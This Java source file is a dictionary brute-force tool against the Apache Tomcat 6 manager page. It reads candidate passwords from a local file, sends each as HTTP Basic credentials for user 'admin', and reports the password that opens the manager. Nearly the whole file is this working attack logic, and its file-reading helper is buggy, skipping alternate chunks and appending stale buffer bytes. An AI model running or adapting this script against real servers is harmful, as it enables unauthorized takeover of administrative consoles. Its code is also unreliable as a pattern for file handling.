package com.vsked.test;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;

import org.apache.log4j.Logger;

import com.vsked.util.DictGen;

import okhttp3.Call;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import sun.misc.BASE64Encoder;

public class Tomcat6Pass {
	
	private static Logger log = Logger.getLogger(Tomcat6Pass.class);
	
	static{
		BaseTest.initLog4j();
	}
	
	public static void main(String[] args) throws Exception {
		String url="http://localhost:8080/manager/html";
		String fpath="d:/sdt0.txt";
//		test0();
		test1(fpath,url);
	}
	
	public static void test0(){
		String userName="admin";
		String passWord="admin";
		passWord=new BASE64Encoder().encode((userName+":"+passWord).getBytes());
//		System.out.println(passWord);
		String url = "http://localhost:8080/manager/html";
		OkHttpClient okHttpClient = new OkHttpClient();
		Request request = new Request.Builder()
		    .header("Authorization", "Basic "+passWord)
		    .url(url)
		    .build();
		Call call = okHttpClient.newCall(request);
		try {
		    Response response = call.execute();
		    String responseContent=response.body().string();
		    log.debug(responseContent);
		} catch (IOException e) {
		    log.error(e.getMessage());
		}
	}
	
	public static void test1(String fpath,String url) throws Exception{
		int intervalTime=10;
		String userName="admin";
		String passWord="admin";
		String s=readFile(fpath);
		String[] tmpArr=s.split(DictGen.lineFlag);
		
		for(int i=0;i<tmpArr.length;i++){
			Thread.sleep(intervalTime);
			passWord=tmpArr[i];
			passWord=passWord.replace("\r", "");
			passWord=passWord.replace("\n", "");
			if(passWord==null || passWord.equals("")) continue;
			
			log.debug("|"+passWord+"|"+passWord.length());
			
			passWord=new BASE64Encoder().encode((userName+":"+passWord).getBytes());
//			System.out.println(passWord);
			OkHttpClient okHttpClient = new OkHttpClient();
			Request request = new Request.Builder()
			    .header("Authorization", "Basic "+passWord)
			    .url(url)
			    .build();
			Call call = okHttpClient.newCall(request);
			try {
			    Response response = call.execute();
			    String responseContent=response.body().string();
			    if(responseContent.indexOf("<title>/manage")>0){
			    	log.debug("success password is"+tmpArr[i]);
			    	break;
			    }else{
			    	System.out.println(tmpArr[i]+"fail");
			    }
//			    log.debug(responseContent);
			} catch (IOException e) {
			    log.error(e.getMessage());
			}
		}

	}
	
	public static String readFile(String fpath) throws Exception{
		FileInputStream fis=new FileInputStream(new File(fpath));
		BufferedInputStream bis=new BufferedInputStream(fis);
		byte[] b=new byte[1024];   //代表一次最多读取1KB的内容

		String fileContent="";
		StringBuffer sb=new StringBuffer();
        int length = 0 ; //代表实际读取的字节数
        while( (length = bis.read( b ) )!= -1 ){
        	bis.read(b);
            sb.append(new String(b));
        }
        fileContent=sb.toString();
        bis.close();
        fis.close();
        return fileContent;
	}

}
